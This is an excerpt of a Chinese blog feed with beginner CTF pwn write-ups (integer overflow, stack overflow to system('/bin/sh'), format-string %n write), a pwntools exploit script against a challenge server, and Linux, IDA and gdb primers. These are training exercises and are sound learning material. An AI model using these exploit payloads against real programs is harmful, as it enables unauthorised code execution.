      <link href="/2021/01/27/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8Bint_overflow/"/>
      <url>/2021/01/27/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8Bint_overflow/</url>
      
        <content type="html"><![CDATA[<p>整数溢出原理：<a href="https://zhuanlan.zhihu.com/p/28563004">https://zhuanlan.zhihu.com/p/28563004</a></p><p> strcpy漏洞讲解：<a href="https://blog.csdn.net/bjbz_cxy/article/details/80388908">https://blog.csdn.net/bjbz_cxy/article/details/80388908</a></p><p> 二进制安全需要记住的取值范围 int8,unsigned int8,float32,Int32:<a href="https://blog.csdn.net/weixin_45556441/article/details/111307829">https://blog.csdn.net/weixin_45556441/article/details/111307829</a></p><h1><span id="0x01-查壳">0x01 查壳</span></h1><p><img src="/images/int_overflow5.png" alt="int_overflow5"></p><h1><span id="0x02-丢ida">0x02 丢IDA</span></h1><p><img src="/images/int_overflow6.png" alt="int_overflow6"></p><p>发现程序可接受用户输入，最大为<code>0x199</code>长度的passwd。进入check_passwd函数进行分析。</p><p><img src="/images/int_overflow7.png" alt="int_overflow7"></p><h1><span id="0x03-信息搜集">0x03 信息搜集</span></h1><p><img src="/images/int_overflow1.png" alt="int_overflow1"></p><p><img src="/images/int_overflow2.png" alt="int_overflow2"></p><p><img src="/images/int_overflow3.png" alt="int_overflow3"></p><h1><span id="0x04-分析">0x04 分析</span></h1><p>从check_passwd发现，题目对passwd的长度进行了检查，要求在4~8范围内才能success</p><p>再观察发现success下面有一个strcpy函数可以实现栈溢出<strong>（具体实现见上发链接）</strong></p><p>结合上方信息搜集可知如果要满足strcpy栈溢出（长度至少0x18+4）if语句不可能成立（范围在4~8）</p><p>又因为passwd的最大长度为0x199 ；  v3的类型为unsigned int8,范围为0~255 ；所以可以想到用整数溢出 </p><p>因为if的范围在[4,8]，所以<strong>payload</strong>的范围应在[259,263]<strong>（具体算法见上方链接）</strong></p><p>所以payload = ‘a’*(0x14+0x04) +  p32(0x08048694) + ‘b’*232（以260为例）</p><p>0x14+0x04 =24        p32(0x08048694) = 4       24+4+232=260</p><p>注意：‘b’*232在strcpy中并没有起到实质性作用，因为栈溢出时运行到p32（0x08048694）就够了</p><p>它主要是在整数溢出时起凑数作用</p><h1><span id="0x05-脚本">0x05 脚本</span></h1><p><img src="/images/int_overflow4.png" alt="int_overflow4"></p>]]></content>
      
      
      
        <tags>
            
            <tag> PWN 整数溢出 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界cgpwn2</title>
      <link href="/2021/01/27/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8Bcgpwn2/"/>
      <url>/2021/01/27/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8Bcgpwn2/</url>
      
        <content type="html"><![CDATA[<p>原博客：<a href="https://bbs.pediy.com/thread-254855.htm">https://bbs.pediy.com/thread-254855.htm</a></p><p><a href="https://www.cnblogs.com/anweilx/p/12631129.html">https://www.cnblogs.com/anweilx/p/12631129.html</a></p><h1><span id="0x01-查壳">0x01 查壳</span></h1><p><img src="/images/cgpwn3.png" alt="cgpwn3"></p><h1><span id="0x02-丢进ida">0x02 丢进IDA</span></h1><p><img src="/images/cgpwn2.png" alt="cgpwn2"></p><p>进入hello函数：</p><p><img src="/images/cgpwn4.png" alt="cgpwn4"></p><p>发现gets函数存在栈溢出</p><p><img src="/images/cgpwn5.png" alt="cgpwn5"></p><p><img src="/images/cgpwn8.png" alt="cgpwn8"></p><ul><li>name在bss段中，地址固定不变</li><li>可以利用fgets函数向name中写东西</li><li>程序中调用了system函数，但是没有/bin/sh</li></ul><h1><span id="0x03-分析">0x03 分析</span></h1><p><strong>存在栈溢出，又知道system的函数，理论上来讲直接调用system去执行”/bin/sh”就可以了。但是题目没有给出”/bin/sh”。怎么办呢？我们自己构造然后传入进去就可以了。</strong></p><p>通过栈溢出漏洞，调用system函数，同时在name中写入“/bin/sh”，把参数地址设置为name的首地址，就可以getshell了</p><h1><span id="0x04-信息采集">0x04 信息采集</span></h1><p>system地址</p><p><img src="/images/cgpwn6.png" alt="cgpwn6"></p><p>name地址</p><p><img src="/images/cgpwn7.png" alt="cgpwn7"></p><h1><span id="0x05-编写脚本">0x05 编写脚本</span></h1><p>‘aaaa’是system的返回地址（随意即可，只要可以保证程序正常运行就行。）</p><p><img src="/images/cgpwn1.png" alt="cgpwn1"></p><h1><span id="0x06-收获">0x06 收获</span></h1><ol><li><p>找system地址方法</p><p>直接在IDA里找</p><p>调试</p><p><img src="/images/cgpwn6.png" alt="cgpwn6"></p><p>在脚本中用函数找（详情见编写脚本）</p></li><li><p>关于system（/bin/sh）</p><p>system（那个指令的地址）</p><p>/bin/sh只是一个字符串</p><p>题目是将字符串/bin/sh写入name这个地址中，再利用system函数调用这个地址从而得到/bin/sh的命令</p></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界pwn新手练习（CGfsb）</title>
      <link href="/2021/01/26/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8BCGfsb/"/>
      <url>/2021/01/26/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8BCGfsb/</url>
      
        <content type="html"><![CDATA[<p>原博客：<a href="https://zhuanlan.zhihu.com/p/97860648">https://zhuanlan.zhihu.com/p/97860648</a></p><h1><span id="0x01-查壳">0x01 查壳</span></h1><p><img src="/images/CGfsb1.jpg" alt="CGfsb1"></p><p>得出32位程序，开了NX(堆栈不可执行)以及CANNARY(栈保护) </p><h1><span id="0x02-看程序逻辑">0x02 看程序逻辑</span></h1><p><img src="/images/CGfsb2.jpg" alt="CGfsb2"></p><p>是一个留言板，可以输入的地方有两处，一处是名字，一处是留言内容</p><h1><span id="0x03-丢进ida">0x03 丢进IDA</span></h1><p><img src="/images/CGfsb3.jpg" alt="CGfsb3"></p><p>很明显，我们需要让<strong>pwnme</strong>这个变量的值等于8，然后便可以拿到flag文件中的东西，这个时候 我们需要注意到它的上面有一行代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">printf（&amp;s）;</span><br></pre></td></tr></table></figure><p>而平时学习的格式是这样的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">printf(&quot;%s&quot;,s)</span><br></pre></td></tr></table></figure><p>上面那样写可以吗？ 答案是可以的，那样写是可以运行的，但同时那样写也是不允许的，为什么呢，因为那是不安全的，他涉及到格式化字符串漏洞</p><p>一般的printf格式是这样：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">printf（&quot;格式化字符串&quot;,参数...)</span><br></pre></td></tr></table></figure><p>它的参数是由格式化说明符与字符串组成的，通过格式化说明符来规定参数用什么格式输出内容。 格式化说明符有这些：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">%d - 十进制 - 输出十进制整数</span><br><span class="line">%s - 字符串 - 从内存中读取字符串</span><br><span class="line">%x - 十六进制 - 输出十六进制数</span><br><span class="line">%c - 字符 - 输出字符</span><br><span class="line">%p - 指针 - 指针地址</span><br><span class="line">%n - 到目前为止所写的字符数</span><br></pre></td></tr></table></figure><p>我们需要注意的是**%n**这个格式化字符串，它的功能是将%n之前打印出来的字符个数，赋值给一个变量，例如这样： </p><p><img src="/images/CGfsb4.png" alt="CGfsb4"></p><p>变量<strong>a的值被改变了。 由此，我们想到是否我们可以改变上面程序中的pwnme</strong>的值，答案时肯定的，利用判断pwnme的值的上一行的代码，我们完全可以做到这一点。 所以说，现在我们要做的有这么几点： 1、我们需要将pwnme的地址输入到s（也就是message）中去 2、在合适的位置上加一个<code>%n</code>，使其与我们输入的地址对应从而造成漏洞利用 所以接下来的问题变成了如何让他们对应起来</p><h1><span id="0x04-查找偏移值">0x04 查找偏移值</span></h1><p>首先，我们得查一下我们输入进去的数据在栈中偏移了多少，知道偏移量后我们才能将其对应起来。</p><p>继续运行一遍程序，我们在massage处输入：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AAAA-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p</span><br></pre></td></tr></table></figure><p>因为下面有个printf（%s），所以我们输入的内容自然会在下面被显示出来。我们看一下结果： </p><p><img src="https://pic3.zhimg.com/80/v2-a9dabe579be77483b740f91bd4a068d2_1440w.png"></p><p>0x41414141便是我们输入的”AAAA”，数一下便知道偏移是10 好了，有了以上东西我们就可以着手开始写exp了 </p><h1><span id="0x05-具体exp如下">0x05 具体exp如下：</span></h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">#r &#x3D; precess(&quot;.&#x2F;CGfsb&quot;)</span><br><span class="line">r &#x3D; remote(&#39;111.198.29.45&#39;, 46635)</span><br><span class="line"></span><br><span class="line">pwnme_addr &#x3D; 0x0804A068           #pwnme地址在伪代码中双击就能查看哦</span><br><span class="line">payload &#x3D; p32(pwnme_addr) + &#39;aaaa&#39; + &#39;%10$n&#39;     #pwnme的地址需要经过32位编码转换，是四位，而pwnme需要等于8，所以‘aaaa’起着凑字数的作用   %10$n就为pwnme的地址</span><br><span class="line"></span><br><span class="line">r.recvuntil(&quot;please tell me your name:\n&quot;)</span><br><span class="line">r.sendline(&#39;BurYiA&#39;)</span><br><span class="line"></span><br><span class="line">r.recvuntil(&quot;leave your message please:\n&quot;)</span><br><span class="line">r.sendline(payload)#fgets读取（安全）  printf输出从而改变了pwnme的值</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h1><span id="0x06-代码效果如下">0x06 代码效果如下：</span></h1><p><img src="https://pic2.zhimg.com/80/v2-ed4ec52768675c69c6ce461305829445_1440w.jpg"></p>]]></content>
      
      
      
        <tags>
            
            <tag> PWN 格式化字符串漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IDA</title>
      <link href="/2021/01/26/IDA/"/>
      <url>/2021/01/26/IDA/</url>
      
        <content type="html"><![CDATA[<p>原博客：<a href="https://blog.csdn.net/qq_27350133/article/details/103796444">https://blog.csdn.net/qq_27350133/article/details/103796444</a></p><h1><span id="text-data-bss等的区别">.text .data .bss等的区别</span></h1><ul><li><p>.text段是代码段。它用来放程序代码（code）。它通常是只读的（程序代码，编译好了就确定了，不可能改来改去的嘛）。</p></li><li><p>.data(ZI data)段是数据段。它用来存放初始化了的（initailized）全局变量（global）和初始化了的静态变量（static）。它是可读可写的。</p></li><li><p>.bss(RW data )段是全局变量数据段。它用来存放未初始化的（uninitailized）全局变量（global）和未初始化的静态变量</p><p>例如：</p></li></ul><p><img src="/images/IDA1.png" alt="IDA1"></p><p><img src="/images/IDA2.png" alt="IDA2"></p><p>代表pwnme（未初始化的全局变量）的地址</p><p><img src="/images/IDA3.png" alt="IDA3"></p><p>代表将ds赋值给eax寄存器的程序代码的地址</p>]]></content>
      
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux基本操作</title>
      <link href="/2021/01/24/Linux%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/"/>
      <url>/2021/01/24/Linux%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/</url>
      
        <content type="html"><![CDATA[<p>原博客：<a href="https://blog.csdn.net/qq_41923771/article/details/81452529?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161141680816780255224080%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=161141680816780255224080&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-81452529.pc_search_result_before_js&amp;utm_term=linux%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C&amp;spm=1018.2226.3001.4187">https://blog.csdn.net/qq_41923771/article/details/81452529?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161141680816780255224080%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=161141680816780255224080&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-81452529.pc_search_result_before_js&amp;utm_term=linux%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C&amp;spm=1018.2226.3001.4187</a></p><p><a href="https://blog.csdn.net/niexinming/article/details/78814422?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161145921616780264011250%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&amp;request_id=161145921616780264011250&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~rank_v29-2-78814422.pc_search_result_before_js&amp;utm_term=pwn%E8%A6%81%E7%9F%A5%E9%81%93%E7%9A%84Linux%E6%93%8D%E4%BD%9C&amp;spm=1018.2226.3001.4187">https://blog.csdn.net/niexinming/article/details/78814422?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161145921616780264011250%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&amp;request_id=161145921616780264011250&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~rank_v29-2-78814422.pc_search_result_before_js&amp;utm_term=pwn%E8%A6%81%E7%9F%A5%E9%81%93%E7%9A%84Linux%E6%93%8D%E4%BD%9C&amp;spm=1018.2226.3001.4187</a></p><h1><span id="什么是linux">什么是Linux</span></h1><p>Linux在操作使用中时通过 输入命令——shell解释——内核处理</p><p>Linux的内核一般包含五大部分：进程管理、存储管理、文件管理、设备管理和网络管理，是一组程序模块，具有访问硬件设备和所有主存空间的权限，是仅有的能够执行特权指令的程序。主要功能是：资源抽象、资源分配、资源共享。（相当于Linux的核心所在）</p><p>shell作用：</p><p>内核是 如何对资源进行合理的分配 和 如何对用户需要作出处理 ，</p><p>1.所有的要执行的进程都要和shell建立连接，shell相当于Linux内核和外界沟通的唯一途径，shell通过分析所有进程的重要性来对各个进程的先后顺序进行合理化分配，从而使得系统更加高效</p><p>2.当客户对内核发出指令时，shell将会将客户所发出的指令进行类似翻译后告诉内核，内核在执行相应的命令</p><p>3.shell在流程中也起到了对内核作保护的作用，将外界指令的安全性进行了处理，内核只需要执行shell传出来的指令即可，增加了工作效率</p><hr><h1><span id="linux常用基础指令">Linux常用基础指令</span></h1><h2><span id="1命令行行提示符含义">1.命令行行提示符含义：</span></h2><p><img src="https://img-blog.csdn.net/20180806141908806?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxOTIzNzcx/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="a"></p><p>kiosk:                       用户名称（root则表示为超级用户）</p><p>@：                          分隔符</p><p>foundation31：     主机名称</p><p>~:                              当前所在系统目录（输入pwd，可以显示当先目录，～为默认， 如果切换目录则会相应的改                                 变）</p><h2><span id="2超级用户登录">2.超级用户登录</span></h2><p>在命令行输入 su</p><p>再输入密码，登陆成功后命令提示符将会改变为root用户，身份提示符变为#</p><p><img src="https://img-blog.csdn.net/20180806143127448?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxOTIzNzcx/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="b"></p><h2><span id="3linux系统结构">3.Linux系统结构</span></h2><p><img src="https://img-blog.csdn.net/2018080712321854?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxOTIzNzcx/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70"></p><p>系统目录各个文件夹介绍：</p><p> /bin     ##二进制文件，系统常规命令<br> /boot     ##系统启动分区，系统启动时读取的文件<br> /dev     ##设备文件<br> /etc     ##大多数配置文件<br> /home     ##普通用户的家目录<br> /lib     ##32位函数库<br> /lib64     ##64位库<br> /media     ##手动临时挂载点<br> /mnt     ##手动临时挂载点<br> /opt     ##第三方软件安装位置<br> /proc     ##进程信息及硬件信息<br> /root     ##超级用户家目录<br> /run     ##临时设备的默认挂载点<br> /sbin     ##系统管理命令<br> /srv     ##数据<br> /var     ##数据<br> /sys     ##内核相关信息<br> /tmp     ##临时文件<br> /usr     ##用户相关设定</p><h2><span id="4linux下的文件管理">4.Linux下的文件管理</span></h2><h3><span id="1建立空白文件">1.建立空白文件</span></h3><p>touch file                建立空文件，或修改文件的时间戳<br>touch file1 file2     建立多个文件（file1 file2）</p><p><img src="https://img-blog.csdn.net/20180807123424400?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxOTIzNzcx/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70"></p><h3><span id="2建立文件夹">2：建立文件夹</span></h3><p>mkdir        ##建立单目录<br>mkdir -p   ##建立多层目录</p><p>eg：mkdir -p 123/456/789   在Desktop中创建123文件夹，在123中创建456文件夹，在456中创建789文件夹</p><p>实现了文件夹的多级目录创建</p><p><img src="https://img-blog.csdn.net/20180807123521110?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxOTIzNzcx/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70"></p><h3><span id="3文件夹的删除">3：文件夹的删除</span></h3><p>rm file           删除file文件夹，但是会提示是否删除，选择yes或者no</p><p>rm  -f file      强行删除文件不提示<br>rm  -fr file    删除当前目录下的所有文件,这个命令很危险，应避免使用。<br>                     所删除的文件，一般都不能恢复！</p><p><img src="https://img-blog.csdn.net/20180807123902711?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxOTIzNzcx/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70"></p><h3><span id="4文件的编辑">4:文件的编辑</span></h3><p><strong>step1</strong>:  vim file        进入file文件编译</p><p><img src="https://img-blog.csdn.net/20180807124020324?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxOTIzNzcx/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70"></p><p><strong>step2</strong>: 进入文件后输入&lt; I &gt;进入文件输入模式，可以向文件中输入内容</p><p><img src="https://img-blog.csdn.net/20180807124144112?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxOTIzNzcx/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70"></p><p><strong>step3</strong>：退出编译模式</p><p>按<esc>退出插入编译模式，进入浏览模式</esc></p><p><strong>step4</strong>：文件的退出</p><p>在浏览模式下输入：</p><p>:q      ##当文件没有做任何修改是可用<br>:q!     ##当文件修改但不行保存修改时可用<br>:wq   ##退出保存（一般用这个）<br>:wq!  ##当文件属于自己或用户为root时可用</p><h3><span id="5文件查看">5.文件查看</span></h3><p>文件查看常用指令</p><p>cat file             输出文件的所有内容</p><p><img src="/images/Linux1.png" alt="Linux1"></p><p><img src="/images/Linux2.png" alt="Linux2"></p><h3><span id="6文件路径">6.文件路径</span></h3><p><strong>相对路径</strong>：（则必须有前提条件，其实在系统底层依然是绝对路径执行，只是用户看到的简略移动）</p><p>   文件相对当前系统位置的一个名称简写<br>   文件名称省略了当前路径的值<br>   只有当前在此目录中时可以使用<br>   文件名称不以/开头<br>   文件名称会自动在字符前加入’pwd’显示的路径</p><p><strong>绝对路径</strong>：</p><p> 是文件在系统中真实的位置<br> 任何时间都可以精确表示一个文件的名称<br> 文件名称以/开头</p><p>pwd           显示当前工作目录<br> cd              切换当前工作目录<br> cd /mnt    切换到/mnt目录中<br> cd -           进入当前目录之前所在目录中</p><p> ls               查看文件夹里的所有文件</p><p><strong>绝对路径和相对路径补充</strong>：</p><p><img src="/images/Linux3.png" alt="Linux3"></p><h2><span id="5常用指令合集">5.常用指令合集</span></h2><p>标准格式：命令名称  [命令参数]  [命令对象]</p><p> ls              列出文件信息</p><p> cd            切换工作目录</p><p>pwd         显示当前目录</p><p>cp             复制</p><p>rm            删除</p><p>nc             建立TCP/UDP链接并监听</p><p>su             切换到超级用户</p><p>touch       创建文件</p><p>mkdir       创建目录</p><hr><h1><span id="linuxamppwn">Linux&amp;PWN</span></h1><h2><span id="pwn是什么">PWN是什么</span></h2><p>在安全领域中指的是通过二进制/系统调用等方式获得目标主机的shell</p><h2><span id="0x01-linux下的pwn常用到的工具">0x01 Linux下的pwn常用到的工具：</span></h2><p> （1）gdb：Linux调试中必要用到的<br> （2）gdb-peda：gdb方便调试的工具，类似的工具有gef，gdbinit，这些工具的安装可以参考：<a href="http://blog.csdn.net/gatieme/article/details/63254211">http://blog.csdn.net/gatieme/article/details/63254211</a><br> （3）pwntools:写exp和poc的利器<br> （4）checksec：可以很方便的知道elf程序的安全性和程序的运行平台<br> （5）objdump和readelf：可以很快的知道elf程序中的关键信息<br> （6）ida pro ：强大的反编译工具<br> （7）ROPgadget：强大的rop利用工具<br> （8）one_gadget：可以快速的寻找libc中的调用exec(‘bin/sh’)的位置<br> （9）libc-database： 可以通过泄露的libc的某个函数地址查出远程系统是用的哪个libc版本 </p><h2><span id="0x02-检测elf的安全性">0x02 检测elf的安全性</span></h2><p>拿到efl，首先要用checksec来检测elf运行于哪个平台，开启了什么安全措施，如果用gcc的编译后，默认会开启所有的安全措施。 </p><p> 【1】RELRO：RELRO会有Partial RELRO和FULL RELRO，如果开启FULL RELRO，意味着我们<strong>无法修改got表</strong><br> 【2】Stack：如果栈中开启Canary found，那么就<strong>不能用直接用溢出的方法覆盖栈中返回地址</strong>，而且要通过改写指针与局部变量、leak canary、overwrite canary的方法来绕过<br> 【3】NX：NX enabled如果这个保护开启就是意味着<strong>栈中数据没有执行权限</strong>，以前的经常用的call esp或者jmp esp的方法就不能使用，但是可以利用rop这种方法绕过<br> 【4】PIE：PIE enabled如果程序开启这个地址随机化选项就意味着<strong>程序每次运行的时候地址都会变化</strong>，而如果没有开PIE的话那么No PIE (0x400000)，括号内的数据就是程序的基地址 </p><p> 【5】 Arch: 查看操作数</p><p><img src="/images/Linux4.png" alt="Linux4"></p><h2><span id="0x03-调试技巧">0x03 调试技巧</span></h2><p>gdb常用的调试指令：<br> n： 执行一行源代码但不进入函数内部<br> <strong>ni: 执行一行汇编代码但不进入函数内部</strong><br> s： 执行一行源代码而且进入函数内部<br> <strong>si: 执行一行汇编代码而且进入函数内部</strong><br> c: 继续执行到下一个断点<br> *<em>b <em>地址: 下断点</em></em><br> directory+源码所在目录：加载程序源码<br> set follow-fork-mode parent ：只调试主进程<br> stack: 显示栈信息<br> x ： 按十六进制格式显示内存数据，其中x/{字节数}x 以16进制显示指定地址处的数据;{字节数}表示字节数制定（b 单字节；h 双字节；w 四字节；g 八字节；默认为四字节） 【x/40wx表示查看40个地址中的内存数据】</p><p>代码实现：</p><p>程序没有开启地址随机化：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">def debug(addr):</span><br><span class="line">    raw_input(&#39;debug:&#39;)</span><br><span class="line">    gdb.attach(r, &quot;b *&quot; + addr)</span><br></pre></td></tr></table></figure><p>在程序运行时调用这个函数就可以调试了 </p><p><img src="/images/Linux5.png" alt="Linux5"></p><p>程序开启地址随机化：(看不懂。。)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">wordSz &#x3D; 4</span><br><span class="line">hwordSz &#x3D; 2</span><br><span class="line">bits &#x3D; 32</span><br><span class="line">PIE &#x3D; 0</span><br><span class="line">mypid&#x3D;0</span><br><span class="line">def leak(address, size):</span><br><span class="line">   with open(&#39;&#x2F;proc&#x2F;%s&#x2F;mem&#39; % mypid) as mem:</span><br><span class="line">      mem.seek(address)</span><br><span class="line">      return mem.read(size)</span><br><span class="line"></span><br><span class="line">def findModuleBase(pid, mem):</span><br><span class="line">   name &#x3D; os.readlink(&#39;&#x2F;proc&#x2F;%s&#x2F;exe&#39; % pid)</span><br><span class="line">   with open(&#39;&#x2F;proc&#x2F;%s&#x2F;maps&#39; % pid) as maps:</span><br><span class="line">      for line in maps:</span><br><span class="line">         if name in line:</span><br><span class="line">            addr &#x3D; int(line.split(&#39;-&#39;)[0], 16)</span><br><span class="line">            mem.seek(addr)</span><br><span class="line">            if mem.read(4) &#x3D;&#x3D; &quot;\x7fELF&quot;:</span><br><span class="line">               bitFormat &#x3D; u8(leak(addr + 4, 1))</span><br><span class="line">               if bitFormat &#x3D;&#x3D; 2:</span><br><span class="line">                  global wordSz</span><br><span class="line">                  global hwordSz</span><br><span class="line">                  global bits</span><br><span class="line">                  wordSz &#x3D; 8</span><br><span class="line">                  hwordSz &#x3D; 4</span><br><span class="line">                  bits &#x3D; 64</span><br><span class="line">               return addr</span><br><span class="line">   log.failure(&quot;Module&#39;s base address not found.&quot;)</span><br><span class="line">   sys.exit(1)</span><br><span class="line"></span><br><span class="line">def debug(addr &#x3D; 0):</span><br><span class="line">    global mypid</span><br><span class="line">    mypid &#x3D; proc.pidof(r)[0]</span><br><span class="line">    raw_input(&#39;debug:&#39;)</span><br><span class="line">    with open(&#39;&#x2F;proc&#x2F;%s&#x2F;mem&#39; % mypid) as mem:</span><br><span class="line">        moduleBase &#x3D; findModuleBase(mypid, mem)</span><br><span class="line">        gdb.attach(r, &quot;set follow-fork-mode parent\nb *&quot; + hex(moduleBase+addr))</span><br></pre></td></tr></table></figure><p>由于开启地址随机化之后ida pro打开程序后，显示的是程序的偏移地址，而不是实际的地址，当程序加载后程序的程序的实际地址是：基地址+偏移地址，调用debug函数的时候只要把偏移地址传递进去就好</p>]]></content>
      
      
      
        <tags>
            
            <tag> Linux PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>汇编基础总结</title>
      <link href="/2021/01/21/%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93/"/>
      <url>/2021/01/21/%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<hr><h1><span id="cpu架构与指令集">CPU架构与指令集</span></h1><p><strong>CPU</strong>：从内存中读取指令，再解码和执行</p><p><strong>指令集</strong>：操作码+特定CPU执行的基本命令；一堆二进制数据；分为CISC与RISC两种</p><p><strong>汇编、指令集之间的关系</strong>：</p><p>​    二进制数据不利于阅读与理解，于是汇编语言诞生，每条汇编指令都有对应的指令</p><h2><span id="cisc与risc对比">CISC与RISC对比</span></h2><p><strong>CISC（x86）</strong>  ：指令长度不固定（1~6字节【32位】）；指令数量相对更多（说白了更讲究）；寻址方式多样；                            通用寄存器更少；</p><p>​                            缺点：反编译会指令错位；</p><p><strong>RISC（ARM）</strong>：指令长度固定（4字节【32位】）；指令数量相对较少需要组合（没那么讲究）；寻址方式单                            一；通用寄存器更多；</p><p>​                            优点：有利于解码和优化，可以实现流水线；</p><p>​                            缺点：平均代码更长，占空间</p><hr><h1><span id="x86x64-汇编基础">x86/x64 汇编基础</span></h1><h2><span id="cpu操作模式">CPU操作模式</span></h2><p><strong>保护模式</strong>：类似虚拟机；所有指令和特性都可用，但只能在分配的内存段使用</p><p><strong>实地址模式</strong>：直接访问硬件及其实际内存地址（类似于直接在cmd里操作。。。。吧？？）</p><p><strong>系统管理模式</strong>：提供电源管理或安全保护特性机制（更个性化？？）</p><h2><span id="语法风格">语法风格</span></h2><p>x86：AT&amp;T风格和Intel风格</p><h2><span id="寄存器与数据类型">寄存器与数据类型</span></h2><h2><span 